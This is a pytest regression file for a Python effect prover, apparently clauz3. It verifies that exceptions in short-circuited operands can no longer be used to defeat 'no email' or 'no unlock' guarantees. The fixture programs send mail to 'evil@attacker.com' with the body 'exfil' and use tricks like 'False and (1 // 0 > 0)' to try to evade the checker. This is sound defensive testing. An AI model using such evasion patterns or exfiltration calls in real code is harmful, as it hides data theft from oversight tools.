"""Exceptions from operands CPython never evaluates must not suppress effects.

``Context.interrupted`` ORs every recorded exception condition, and a trusted
call records its effect as ``FactInfo(cond=ctx.interrupted.m_not(...))``. An
unconditionally-true ``interrupted`` therefore gives every effect fact
``cond=False`` and discharges effect guarantees vacuously.

``eval_bool_op`` and ``eval_ternary_op`` used to evaluate *every* operand in
the caller's context, so an operand behind a short circuit still recorded its
exception. Combined with ``@deal.raises(...)`` -- which makes
``Theorem.constraints`` drop the matching exception constraint while it still
feeds ``interrupted`` -- that turned ordinary ``/``, ``//``, ``%`` and
``float()`` into effect-suppression primitives.
"""

from pathlib import Path

import pytest

from clauz3._vendor.deal_solver import Conclusion
from clauz3.prover import ProofResult, prove_text

ROOT = Path(__file__).resolve().parents[1]
EMAIL_ROOT = ROOT / "examples/email"
EMAIL_TRUSTED_ROOT = EMAIL_ROOT / "tools/email/trusted"
HOME_ROOT = ROOT / "examples/home-automation"
HOME_TRUSTED_ROOT = HOME_ROOT / "tools/home/trusted"

# Every one of these raises in CPython only if it is actually evaluated. The
# third element is a harmless value of the same type, for the ternary arm that
# CPython does take -- `if_expr` cannot merge arms of different z3 sorts.
RAISING_EXPRESSIONS = [
    ("1 // 0", "ZeroDivisionError", "0"),
    ("1 % 0", "ZeroDivisionError", "0"),
    ("1 / 0", "ZeroDivisionError", "0.0"),
    ("1.0 / 0.0", "ZeroDivisionError", "0.0"),
    ("1.0 // 0.0", "ZeroDivisionError", "0.0"),
]


def _prove_email(source: str) -> ProofResult:
    results = prove_text(
        source,
        import_paths=[EMAIL_ROOT],
        trusted_roots=[EMAIL_TRUSTED_ROOT],
    )
    assert len(results) == 1
    return results[0]


def _prove_home(body: str) -> ProofResult:
    results = prove_text(
        "import clauz3\n"
        "from tools.home.trusted import contracts as home\n"
        "from tools.home.trusted.effects import unlock_door\n" + body,
        import_paths=[HOME_ROOT],
        trusted_roots=[HOME_TRUSTED_ROOT],
    )
    assert len(results) == 1
    return results[0]


@pytest.mark.parametrize(("expression", "exception", "_inert"), RAISING_EXPRESSIONS)
def test_dead_boolop_operand_cannot_suppress_effect(
    expression: str,
    exception: str,
    _inert: str,
) -> None:
    """``False and X`` never evaluates ``X``, so the email is really sent."""
    result = _prove_email(f"""\
import deal

import clauz3
from tools.email.trusted import contracts as email
from tools.email.trusted.effects import send_email


@deal.raises({exception})
@clauz3.guarantee(email.none())
def main() -> None:
    _unused = False and ({expression} > 0)
    send_email("evil@attacker.com", "exfil")
""")

    assert result.proof.conclusion is Conclusion.FAIL


@pytest.mark.parametrize(("expression", "exception", "inert"), RAISING_EXPRESSIONS)
def test_dead_ternary_arm_cannot_suppress_effect(
    expression: str,
    exception: str,
    inert: str,
) -> None:
    """``X if False else <inert>`` never evaluates ``X``."""
    result = _prove_email(f"""\
import deal

import clauz3
from tools.email.trusted import contracts as email
from tools.email.trusted.effects import send_email


@deal.raises({exception})
@clauz3.guarantee(email.none())
def main() -> None:
    _unused = ({expression}) if False else {inert}
    send_email("evil@attacker.com", "exfil")
""")

    assert result.proof.conclusion is Conclusion.FAIL


def test_unconditional_exception_on_a_live_path_still_suppresses() -> None:
    """The remaining ``@deal.raises`` interaction is sound, and stays pinned.

    Here the division really is evaluated, so CPython raises before reaching
    ``send_email`` and no effect occurs. Suppressing the later effect fact is
    therefore correct, not a false OK: the guarantee holds because the program
    crashes. ``clauz3 run`` surfaces the crash. This is the boundary that made
    the short-circuit cases unsound -- there the operand was never evaluated.
    """
    result = _prove_email("""\
import deal

import clauz3
from tools.email.trusted import contracts as email
from tools.email.trusted.effects import send_email


@deal.raises(ZeroDivisionError)
@clauz3.guarantee(email.none())
def main() -> None:
    _unused = 1 // 0
    send_email("evil@attacker.com", "exfil")
""")

    assert result.proof.conclusion is Conclusion.OK


def test_mixed_sort_ternary_fails_closed() -> None:
    """Symbolically selected arms must have compatible represented types."""
    result = _prove_email("""\
import clauz3
from tools.email.trusted import contracts as email
from tools.email.trusted.effects import send_email


@clauz3.guarantee(email.none())
def main(flag: bool) -> None:
    _unused = 1.0 if flag else 0
    send_email("evil@attacker.com", "exfil")
""")

    assert result.proof.conclusion is Conclusion.SKIP
    assert "cannot merge conditional expression arms of different types" in str(
        result.proof.error
    )


def test_dead_or_operand_cannot_suppress_effect() -> None:
    """``True or X`` never evaluates ``X`` either."""
    result = _prove_email("""\
import deal

import clauz3
from tools.email.trusted import contracts as email
from tools.email.trusted.effects import send_email


@deal.raises(ZeroDivisionError)
@clauz3.guarantee(email.none())
def main() -> None:
    _unused = True or (1 // 0 > 0)
    send_email("evil@attacker.com", "exfil")
""")

    assert result.proof.conclusion is Conclusion.FAIL


def test_live_ternary_arm_still_records_its_exception() -> None:
    """The guard must not discard an exception on the arm CPython does take."""
    result = _prove_home("""
@clauz3.guarantee(home.no_unlocks())
def main(flag: bool) -> None:
    _unused = (1 // 0) if flag else 0
    unlock_door("front")
""")

    assert result.proof.conclusion is Conclusion.FAIL


def test_symbolic_boolop_operand_exception_is_guarded_not_dropped() -> None:
    """A reachable operand keeps its exception, conditioned on the guard."""
    result = _prove_home("""
@clauz3.guarantee(home.no_unlocks())
def main(flag: bool) -> None:
    _unused = flag and (1 // 0 > 0)
    unlock_door("front")
""")

    assert result.proof.conclusion is Conclusion.FAIL


@pytest.mark.parametrize("expression", ["x // 2", "x % 2"])
def test_statically_false_exception_does_not_block_comprehension(
    expression: str,
) -> None:
    """``2 == 0`` is statically false, so no exception is really possible.

    ``_compr_reject_effects`` fails closed on a non-empty exception layer, so
    recording an impossible exception silently removed ``//`` and ``%`` from
    the supported subset inside comprehensions.
    """
    result = _prove_home(f"""
@clauz3.guarantee(home.no_unlocks())
def main() -> None:
    _ys = [{expression} for x in [1, 2, 3]]
""")

    assert result.proof.conclusion is Conclusion.OK


def test_float_only_arithmetic_still_proves_inside_comprehension() -> None:
    result = _prove_home("""
@clauz3.guarantee(home.no_unlocks())
def main() -> None:
    _ys = [x / 2.0 for x in [1.5, 2.5]]
""")

    assert result.proof.conclusion is Conclusion.OK


@pytest.mark.parametrize("expression", ["x / 2", "float(x)", "x * 1.5"])
def test_int_to_float_in_comprehension_still_fails_closed(
    expression: str,
) -> None:
    """int->float conversion of an unbounded element can genuinely overflow.

    A comprehension element is an unconstrained symbolic int, so the
    ``OverflowError`` obligation ``IntSort.m_float`` records is satisfiable
    rather than statically false. Failing closed here is correct; it is the
    documented cost of modelling ``int(float)`` exactly.
    """
    result = _prove_home(f"""
@clauz3.guarantee(home.no_unlocks())
def main() -> None:
    _ys = [{expression} for x in [1, 2, 3]]
""")

    assert result.proof.conclusion is Conclusion.SKIP


@pytest.mark.parametrize("expression", ["x // 2", "x % 2"])
def test_statically_false_exception_does_not_block_lambda(
    expression: str,
) -> None:
    result = _prove_home(f"""
@clauz3.guarantee(home.no_unlocks())
def main() -> None:
    _f = lambda x: {expression}
    _y = _f(4)
""")

    assert result.proof.conclusion is Conclusion.OK


@pytest.mark.parametrize(("expression", "exception", "_inert"), RAISING_EXPRESSIONS)
def test_dead_chained_comparison_operand_cannot_suppress_effect(
    expression: str,
    exception: str,
    _inert: str,
) -> None:
    """``1 < 0 < X`` never evaluates ``X``.

    A chain short-circuits exactly like ``and``: CPython evaluates the third
    operand only when the first comparison held. ``eval_compare`` therefore
    needs the same guarded child context that ``eval_bool_op`` uses.
    """
    result = _prove_email(f"""\
import deal

import clauz3
from tools.email.trusted import contracts as email
from tools.email.trusted.effects import send_email


@deal.raises({exception})
@clauz3.guarantee(email.none())
def main() -> None:
    _unused = 1 < 0 < ({expression})
    send_email("evil@attacker.com", "exfil")
""")

    assert result.proof.conclusion is Conclusion.FAIL


def test_live_chained_comparison_operand_still_records_its_exception() -> None:
    """A chain whose guard can hold must keep the operand's exception."""
    result = _prove_home("""
@clauz3.guarantee(home.no_unlocks())
def main(n: int) -> None:
    _unused = 0 < n < (1 // 0)
    unlock_door("front")
""")

    assert result.proof.conclusion is Conclusion.FAIL
